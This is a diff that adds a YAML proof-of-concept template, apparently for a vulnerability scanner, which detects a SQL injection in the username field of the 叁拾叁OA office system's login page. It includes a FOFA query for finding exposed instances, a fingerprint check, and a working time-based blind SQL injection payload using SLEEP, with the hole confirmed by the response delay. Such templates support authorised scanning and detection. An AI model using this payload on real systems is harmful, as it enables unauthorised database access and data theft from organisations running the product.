@@ -1,0 +1,22 @@
+id: poc-yaml-33iot-oa-username-sqli
+info:
+  name: 叁拾叁OA username SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 叁拾叁OA
+  fofa: app="江苏叁拾叁-OA"
+variables:
+  t1: random_int(4,9)
+  t2: t1 + 2
+requests:
+- method: GET
+  path: /login.jsp
+  expression: status_code == 200 && contains(body,"江苏叁拾叁")
+- method: POST
+  path: /login
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: username=1'+AND+(SELECT+4935+FROM+(SELECT(SLEEP({{.t1}})))tHaE)+AND+'pyTD'='pyTD&password=1
+  expression: status_code == 302 && body == "" && duration > t1 && duration < t2
+transport: http
